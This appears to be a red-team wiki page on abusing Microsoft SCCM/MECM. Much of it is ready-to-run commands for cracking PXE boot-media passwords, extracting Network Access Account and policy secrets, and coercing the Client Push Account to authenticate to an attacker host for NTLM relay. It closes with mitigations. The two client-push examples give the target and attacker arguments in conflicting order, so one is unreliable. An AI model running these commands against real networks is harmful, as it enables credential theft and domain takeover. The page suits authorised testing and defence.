---
title: SCCM/MECM Abuse
type: concept
created: 2026-06-13
updated: 2026-06-13
tags: [active-directory, sccm, mecm, lateral-movement, credential-access]
---

# SCCM/MECM Abuse

System Center Configuration Manager (SCCM, now Microsoft Configuration
Manager / MECM) manages software deployment, patching, and OS imaging
across a Windows estate. Its deep AD integration and the broad privileges
it requires (often including domain-admin-equivalent service accounts) make
it a high-value target.

## Discovery

- **Site/Management Point discovery**:
  `SharpSCCM.exe get site-info -d corp.local`
- **PXE boot media**: SCCM frequently serves OS deployment over PXE. Boot
  media (`.boot.var`/WIM) can be downloaded via TFTP and, if
  password-protected, cracked offline:
  ```bash
  hashcat -m 19850 pxe_hash.txt wordlist.txt
  ```
  Tool: **PXEThief**.

## Local credential/secret extraction (requires local admin/SYSTEM on a client)

- **SharpSCCM WMI method** — active secrets from
  `root\ccm\policy\Machine\ActualConfig`:
  `SharpSCCM.exe local secrets -m wmi`
- **SharpSCCM disk method** — parses `OBJECTS.DATA` in the CIM repository,
  can recover historical/deleted secrets:
  `SharpSCCM.exe local secrets -m disk`
- **SharpDPAPI** — extracts the Network Access Account (NAA) via DPAPI:
  `SharpDPAPI.exe sccm`
- Quick local triage: `SharpSCCM.exe local triage`

## Remote/policy-based extraction (no local admin needed)

Requires a valid domain computer account or the ability to register a new
device (cf. Machine Account Quota, same primitive as
[[kerberos-delegation-abuse|RBCD]]).

```bash
SharpSCCM.exe get secrets
SharpSCCM.exe get secrets -u COMPUTER$ -p Password123 -r NEWDEVICE
```

## Lateral movement

- **Client Push Account coercion** — force the SCCM server to authenticate
  to an attacker-controlled host using the high-privileged Client Push
  Account:
  ```bash
  SharpSCCM.exe invoke client-push -t <TARGET_HOSTNAME> -s <ATTACKER_IP>
  ```
  This is a coercion + [[ntlm-relay-coercion|NTLM relay]] primitive against
  the Management Point.

## Commands

```bash
# --- PXE boot media (no creds, network access to PXE only) ---
# 1. Find a PXE-enabled DP and request the boot media over TFTP
python3 pxethief.py 1 <DP_IP>           # lists available variable files
python3 pxethief.py 2 <DP_IP> <file>    # downloads the .bcd / variables file

# 2. Decrypt if password-protected (media variable password), or crack offline
python3 pxethief.py 3 <downloaded_file>          # attempt decrypt with known/blank pw
hashcat -m 19850 pxe_hash.txt wordlist.txt        # crack the media password
```

```bash
# --- Remote secrets via registered device (Machine Account Quota path) ---
# Register a new device and pull policy secrets without local admin anywhere
SharpSCCM.exe get secrets -u 'DOMAIN\NEWDEVICE$' -p 'Password123' -r NEWDEVICE -ip <MP_IP>
```

```bash
# --- Local extraction once you have admin/SYSTEM on a client ---
SharpSCCM.exe local triage
SharpSCCM.exe local secrets -m wmi
SharpSCCM.exe local secrets -m disk
SharpDPAPI.exe sccm
```

```bash
# --- Client Push coercion -> NTLM relay to Management Point (see [[ntlm-relay-coercion]]) ---
# 1. Stand up a relay listener targeting the MP's site DB / admin service
ntlmrelayx.py -t https://<MP_FQDN>/AdminService/wmi -smb2support

# 2. Coerce the SCCM server (running as the Client Push Account) to authenticate
#    to your relay listener by claiming a new client needs pushing
SharpSCCM.exe invoke client-push -t <attacker-controlled-hostname> -s <SCCM_SERVER_IP>
```

## Secret types of interest

| Secret | Notes |
|---|---|
| Network Access Account (NAA) | Domain creds clients use to reach Distribution Points; often badly over-scoped (seen as Domain Admin) |
| Task Sequence Variables | Creds/secrets embedded in OSD/maintenance sequences |
| Collection Variables | Per-collection variables, sometimes hold script passwords |
| Client Push Account | Used to install the SCCM client on new machines |

## Mitigations

- Least privilege NAA — read-only on specific shares, never Domain Admin.
- Strong PXE boot media passwords.
- Disable Client Push; use GPO-based or manual client installation instead.
- HTTPS-only (PKI-backed) MECM communication; strict client approval.
- Enable EPA on the Management Point IIS site (mirrors AD CS ESC8/ESC11
  mitigation — see [[ad-cs-esc-attacks]], [[ntlm-relay-coercion]]).

## Links

- [[ntlm-relay-coercion]] — Client Push coercion + MP relay
- [[kerberos-delegation-abuse]] — Machine Account Quota as a shared
  no-creds-needed primitive
- [[remote-execution]] — WinRM/PSRemoting, the SCCM lateral channel
- [[wds-mdt-discovery]] — sibling deployment-infrastructure attack surface

## References

- [SharpSCCM](https://github.com/SpecterOps/SharpSCCM)
- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
- [The Hacker Recipes: SCCM/MECM](https://thehacker.recipes/ad/movement/sccm-mecm)
</content>
